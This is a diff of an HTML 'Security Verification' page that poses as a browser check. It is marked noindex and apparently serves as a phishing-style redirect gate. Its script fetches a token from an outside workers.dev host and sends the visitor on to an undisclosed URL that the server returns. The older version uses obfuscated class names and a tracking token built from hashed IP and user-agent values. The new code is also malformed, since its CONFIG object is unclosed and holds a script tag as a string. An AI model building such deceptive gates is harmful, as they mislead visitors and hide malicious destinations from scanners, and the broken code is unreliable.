@@ -1,84 +1,165 @@
 <!DOCTYPE html>
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-     
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noindex, nofollow">
-    <title></title>
-    <link href="" rel="stylesheet">
-    <script src="config.js"></script>
-    <script>
-        var rcScript = document.createElement('script');
-        rcScript.src = 'https://www.google.com/recaptcha/api.js?render=' + CONFIG.recaptchaSiteKey;
-        rcScript.async = true;
-        rcScript.defer = true;
-        document.head.appendChild(rcScript);
-    </script>
+    <title>Security Verification</title>
     <style>
         *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-        body{display:flex;justify-content:center;align-items:center;background:#ffffff url('56305765648499205143343?t=eyJpcCI6ImNhZmQxMjI4ZTY2Y2UxYjU0MmU3ZWU5Mjg4MTk4YmQyMDVkYTFkMWVhNDVjMWE0ZDgzOTg0ZjNjMjI4Y2UxZTgiLCJ1YSI6Ijc1MjZjMDBlMTgzNjdiOTIwZTA5M2I1OGM0Mjk3M2Y3ZWYxN2IwNjIzZjI0MjMyMTU5ZGRmMTEwZjYzZjhjYmYiLCJleHAiOjE3Nzg4NDczMjksImltZyI6MX0.a4f4a0ab08492c0dbf62eef162f6ab0ef76303bcf089a7281d2f3d2128d7857c') center/cover no-repeat fixed;font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh}
+        body{display:flex;justify-content:center;align-items:center;background:#f5f5f5 center/cover no-repeat fixed;font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh}
+        
+        .card{position:relative;width:100%;max-width:400px;margin:24px;background:#043058;border-radius:16px;border-left:4px solid #043058;overflow:hidden;box-shadow:0 25px 50px rgba(0,0,0,0.35)}
+        .card-content{padding:32px 28px}
+        .header{display:flex;flex-direction:column;align-items:center;text-align:center;margin-bottom:28px}
+        .icon-box{width:54px;height:54px;background:linear-gradient(135deg,#043058,#043058);border-radius:16px;display:flex;align-items:center;justify-content:center;color:#e0e7ff;flex-shrink:0;margin-bottom:16px;box-shadow:0 8px 20px rgba(79,70,229,0.25)}
+        .icon-box svg{width:28px;height:28px}
+        .title{font-size:22px;font-weight:700;color:#f1f5f9;letter-spacing:-0.03em;line-height:1.2;margin-bottom:6px}
+        .subtitle{font-size:14px;color:#24a0ed;line-height:1.6}
 
-        .v53f40cdf{position:relative;width:100%;max-width:400px;margin:24px;background:#043058;border-radius:16px;border-left:4px solid #043058;overflow:hidden;box-shadow:0 25px 50px rgba(0,0,0,0.35)}
-        .h00f2616d{padding:32px 28px}
-        .i448eaf3c{display:flex;flex-direction:column;align-items:center;text-align:center;margin-bottom:28px}
-        .odcd26525{width:54px;height:54px;background:linear-gradient(135deg,#043058,#043058);border-radius:16px;display:flex;align-items:center;justify-content:center;color:#e0e7ff;flex-shrink:0;margin-bottom:16px;box-shadow:0 8px 20px rgba(79,70,229,0.25)}
-        .odcd26525 svg{width:28px;height:28px}
-        .l7f60d922{font-size:22px;font-weight:700;color:#f1f5f9;letter-spacing:-0.03em;line-height:1.2;margin-bottom:6px}
-        .pb11f8055{font-size:14px;color:#24a0ed;line-height:1.6}
+        .verify-button{position:relative;display:flex;align-items:center;gap:14px;width:100%;padding:14px 16px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:12px;cursor:pointer;transition:all .25s ease;overflow:hidden}
+        .verify-button:hover{background:rgba(255,255,255,0.08);border-color:rgba(255,255,255,0.12)}
+        .verify-button.loading{opacity:0.6;cursor:not-allowed}
+        .verify-button.verified{background:rgba(34,197,94,0.1);border-color:rgba(34,197,94,0.3)}
 
-        .tde08220a{position:relative;display:flex;align-items:center;gap:14px;width:100%;padding:14px 16px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:12px;cursor:pointer;transition:all .25s ease;overflow:hidden}
+        .checkbox{position:relative;width:28px;height:28px;border:2px solid #334155;border-radius:7px;display:flex;align-items:center;justify-content:center;background:#1e293b;flex-shrink:0;transition:all .25s ease}
+        .verify-button:hover .checkbox{border-color:#07559d;background:#07559d}
+        .verify-button.verified .checkbox{border-color:#22c55e;background:#22c55e}
 
-        .k84cfe695{position:relative;width:28px;height:28px;border:2px solid #334155;border-radius:7px;display:flex;align-items:center;justify-content:center;background:#1e293b;flex-shrink:0;transition:all .25s ease}
-        .tde08220a:hover .k84cfe695{border-color:#07559d;background:#07559d}
+        .button-text{flex:1}
+        .button-title{font-size:14px;font-weight:600;color:#e2e8f0;display:block;transition:color .2s}
+        .button-subtitle{font-size:11px;color:#475569;display:block;margin-top:2px;font-weight:500}
 
-        .g15a02ffe{flex:1}
-        .ia41aaada{font-size:14px;font-weight:600;color:#e2e8f0;display:block;transition:color .2s}
-        .h4cd33cd7{font-size:11px;color:#475569;display:block;margin-top:2px;font-weight:500}
+        .arrow{color:#475569;transition:color .22s,transform .22s;flex-shrink:0}
+        .verify-button:hover:not(.verified):not(.loading) .arrow{color:#07559d;transform:translateX(3px)}
 
-        .o0b1748b1{color:#475569;transition:color .22s,transform .22s;flex-shrink:0}
-        .tde08220a:hover:not(.verified):not(.loading) .o0b1748b1{color:#07559d;transform:translateX(3px)}
-
-        .q5761be56{display:flex;align-items:center;justify-content:space-between;margin-top:20px;padding-top:14px;border-top:1px solid rgba(255,255,255,0.06)}
-        .z5d7339b5{display:flex;align-items:center;gap:6px;font-size:10px;color:#07559d;font-weight:600;text-transform:uppercase;letter-spacing:.08em}
-        .yf9fac652{width:5px;height:5px;background:#22c55e;border-radius:50%;box-shadow:0 0 6px rgba(34,197,94,0.5);animation:blink 3s ease-in-out infinite}
-        .u1beaea87{font-size:10px;color:#334155;font-weight:500;letter-spacing:.04em}
+        .footer{display:flex;align-items:center;justify-content:space-between;margin-top:20px;padding-top:14px;border-top:1px solid rgba(255,255,255,0.06)}
+        .encrypted{display:flex;align-items:center;gap:6px;font-size:10px;color:#07559d;font-weight:600;text-transform:uppercase;letter-spacing:.08em}
+        .dot{width:5px;height:5px;background:#22c55e;border-radius:50%;box-shadow:0 0 6px rgba(34,197,94,0.5);animation:blink 3s ease-in-out infinite}
+        .shield-text{font-size:10px;color:#334155;font-weight:500;letter-spacing:.04em}
 
         @keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        
+        .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px}
+
+        .error{color:#ff4444;font-size:12px;margin-top:12px;text-align:center;display:none}
     </style>
 </head>
 <body>
-    <div class="v53f40cdf">
-        <div class="h00f2616d" id="r939b7af6d3">
-            <div class="i448eaf3c" id="cc69b013a26">
-                <div class="odcd26525" id="m5e618e3c45">
+    <div class="card">
+        <div class="card-content">
+            <div class="header">
+                <div class="icon-box">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                 </div>
-                <div class="l7f60d922">Security Verification</div>
-                <div class="pb11f8055" id="i08a733270b">Click the button below to verify.</div>
+                <div class="title">Security Verification</div>
+                <div class="subtitle" id="status-text">Click the button below to verify.</div>
             </div>
-            <div class="tde08220a" id="j91617d911e">
-                <div class="k84cfe695">
-                    <svg class="xd527a85f" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+
+            <div class="verify-button" id="verify-btn">
+                <div class="checkbox">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
                 </div>
-                <div class="g15a02ffe">
-                    <span class="ia41aaada" id="bce5695e4f2">Click to Verify</span>
-                    <span class="h4cd33cd7">Click to verify your browser</span>
+                <div class="button-text">
+                    <span class="button-title" id="btn-text">Click to Verify</span>
+                    <span class="button-subtitle">Verify your browser identity</span>
                 </div>
-                <svg class="o0b1748b1" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+                <svg class="arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
             </div>
-            <div class="q5761be56" id="g5cf3aa1d49">
-                <div class="z5d7339b5"><span class="yf9fac652"></span>Encrypted</div>
-                <div class="u1beaea87" id="sfebd99f8b8">Protected by Shield</div>
+
+            <div class="footer">
+                <div class="encrypted"><span class="dot"></span>Encrypted</div>
+                <div class="shield-text">Protected by Shield</div>
             </div>
+
+            <div class="error" id="error-msg"></div>
         </div>
     </div>
 
     <script>
-        document.getElementById("j91617d911e").addEventListener("click", function() {
-            grecaptcha.ready(function() {
-                grecaptcha.execute(CONFIG.recaptchaSiteKey, {action: 'verify'}).then(function(token) {
-                    window.location.href = CONFIG.redirectUrl;
-                });
-            });
+        // CONFIGURATION 
+        const CONFIG = {
+            workerUrl: '<script src="https://calm-cell-0739.arseniodacosta070.workers.dev/config.js"></script>'  
+
+        let formToken = null;
+
+        // Load token when page loads
+        window.addEventListener('load', function() {
+            loadToken();
         });
+
+        function loadToken() {
+            fetch(CONFIG.workerUrl + '/api/generate-form')
+                .then(response => response.json())
+                .then(data => {
+                    formToken = data.token;
+                    console.log('Token loaded');
+                })
+                .catch(error => {
+                    showError('Failed to load verification form');
+                    console.error('Error:', error);
+                });
+        }
+
+        // Click handler for verify button
+        document.getElementById('verify-btn').addEventListener('click', function() {
+            if (!formToken) {
+                showError('Token not ready. Please refresh the page.');
+                return;
+            }
+
+            verifyToken();
+        });
+
+        function verifyToken() {
+            const btn = document.getElementById('verify-btn');
+            
+            // Add loading state
+            btn.classList.add('loading');
+            document.getElementById('btn-text').innerHTML = '<span class="spinner"></span>Verifying...';
+
+            // Send token to worker for verification
+            fetch(CONFIG.workerUrl + '/api/verify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    token: formToken,
+                    action: 'verify'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.verified) {
+                    // Success
+                    btn.classList.remove('loading');
+                    btn.classList.add('verified');
+                    document.getElementById('btn-text').textContent = 'Verified ✓';
+                    document.getElementById('status-text').textContent = 'Redirecting...';
+                    
+                    // Redirect after 1.5 seconds
+                    setTimeout(() => {
+                        window.location.href = data.redirectUrl;
+                    }, 1500);
+                } else {
+                    showError('Verification failed');
+                }
+            })
+            .catch(error => {
+                btn.classList.remove('loading');
+                document.getElementById('btn-text').textContent = 'Try Again';
+                showError('Network error. Please try again.');
+                console.error('Error:', error);
+            });
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('error-msg');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+        }
     </script>
-</body></html>
+</body>
+</html>
